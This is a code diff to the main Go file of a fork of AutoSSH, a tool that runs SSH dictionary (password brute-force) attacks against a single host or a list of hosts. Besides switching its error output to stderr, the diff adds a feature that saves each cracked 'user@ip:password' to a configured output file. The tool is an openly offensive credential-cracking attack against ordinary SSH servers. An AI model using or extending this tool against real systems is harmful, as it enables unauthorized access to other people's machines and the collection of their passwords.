@@ -12,7 +12,7 @@ import (
 )
 
 func main() {
-	fmt.Println("AutoSSH v1.1.3 - https://github.com/cfschilham/autossh")
+	fmt.Println("Fork of: AutoSSH v1.1.3 - https://github.com/cfschilham/autossh")
 
 	fmt.Println("Loading cfg/config.yml...")
 	config, err := loadcfg.LoadConfig()
@@ -40,7 +40,7 @@ func main() {
 			sc.Scan()
 			input := sc.Text()
 			if sc.Err() != nil {
-				log.Println(sc.Err())
+				fmt.Fprintln(os.Stderr, sc.Err())
 				continue
 			}
 
@@ -51,7 +51,7 @@ func main() {
 			// Use user input to create a new Host struct
 			host, err := loadcfg.StrToHost(input, config.UsrIsHost())
 			if err != nil {
-				log.Println(err.Error())
+				fmt.Fprintln(os.Stderr, err.Error())
 				continue
 			}
 
@@ -59,17 +59,24 @@ func main() {
 			// dictionary
 			ip, err := host.ResolveIP()
 			if err != nil {
-				log.Println(err.Error())
+				fmt.Fprintln(os.Stderr, err.Error())
 				continue
 			}
 
 			fmt.Printf("Attempting to connect to '%s@%s'...\n", host.Username(), host.IP())
 			pwd, err := sshatk.SSHDict(ip, host.Username(), config.Port(), dict.Pwds(), config)
 			if err != nil {
-				log.Println(err.Error())
+				fmt.Fprintln(os.Stderr, err.Error())
 				continue
 			}
 			fmt.Printf("Password of '%s' found: %s\n", host.Username()+"@"+host.IP(), pwd)
+
+			if config.OutputPath() != "" {
+				s := fmt.Sprintf("%s@%s:%s", host.Username(), host.IP(), pwd)
+				if err := loadcfg.ExportToFile(s, config.OutputPath()); err != nil {
+					fmt.Fprintln(os.Stderr, err.Error())
+				}
+			}
 		}
 
 	case "hostlist":
@@ -89,25 +96,32 @@ func main() {
 			// dictionary
 			ip, err := host.ResolveIP()
 			if err != nil {
-				log.Println(err.Error())
+				fmt.Fprintln(os.Stderr, err.Error())
 				continue
 			}
 
 			pwd, err := sshatk.SSHDict(ip, host.Username(), config.Port(), dict.Pwds(), config)
 			if err != nil {
-				log.Println(err.Error())
+				fmt.Fprintln(os.Stderr, err.Error())
 				continue
 			}
 			fmt.Printf("Password of '%s' found: '%s'\n", host.Username()+"@"+host.IP(), pwd)
+			if config.OutputPath() != "" {
+				s := fmt.Sprintf("%s@%s:%s", host.Username(), host.IP(), pwd)
+				if err := loadcfg.ExportToFile(s, config.OutputPath()); err != nil {
+					fmt.Fprintln(os.Stderr, err.Error())
+				}
+			}
 			foundCredentials[host.IP()+"@"+host.Username()] = pwd
 		}
 
-		// Print all found combinations
+		// Print all found combinations, export them to a file if configured
 		if len(foundCredentials) > 0 {
 			fmt.Println("The following combinations were found: ")
 			for host, pwd := range foundCredentials {
 				fmt.Printf("Host: '%s' | Password: '%s'\n", host, pwd)
 			}
+
 		} else {
 			fmt.Println("No combinations were found")
 		}
